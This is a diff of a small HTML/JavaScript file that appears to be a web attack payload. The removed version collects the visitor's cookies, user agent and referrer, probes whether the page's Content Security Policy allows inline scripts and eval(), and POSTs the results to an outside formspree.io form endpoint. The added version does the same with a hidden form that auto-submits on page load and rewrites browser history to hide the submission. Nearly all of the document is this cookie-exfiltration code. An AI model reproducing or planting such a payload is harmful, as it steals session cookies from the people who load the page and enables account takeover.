@@ -1,22 +1,33 @@
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        let data = {
-            cookie_data: document.cookie,
-            user_agent: navigator.userAgent,
-            referrer: document.referrer,
-            csp_test: "inline_script_execution",
-        };
+<html>
+  <body>
+    <form id="autoForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
+      <input type="hidden" name="cookie_data" id="cookie_data" value="" />
+      <input type="hidden" name="user_agent" id="user_agent" value="" />
+      <input type="hidden" name="referrer" value="No_Referrer" />
+      <input type="hidden" name="fallback" value="not_empty" />
+      <input type="submit" value="Submit request" />
+    </form>
 
-        try {
-            eval("data.eval_test = 'CSP allows eval()';");
-        } catch (e) {
-            data.eval_test = "Blocked by CSP";
-        }
+    <button onclick="submitForm()">Submit Manually</button>
 
-        fetch("https://formspree.io/f/xeoqzkqe", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        });
-    });
-</script>
+    <script>
+      function getCookies() {
+        return document.cookie; // Get all cookies as a string
+      }
+
+      function submitForm() {
+        document.getElementById('cookie_data').value = getCookies(); // Set cookies
+        document.getElementById('user_agent').value = navigator.userAgent; // Set user agent
+        document.getElementById('autoForm').submit();
+      }
+
+      // Auto-submit the form when the page loads
+      window.onload = function() {
+        submitForm();
+      };
+
+      // Clear history to remove form submission URL
+      history.pushState('', '', '/');
+    </script>
+  </body>
+</html>
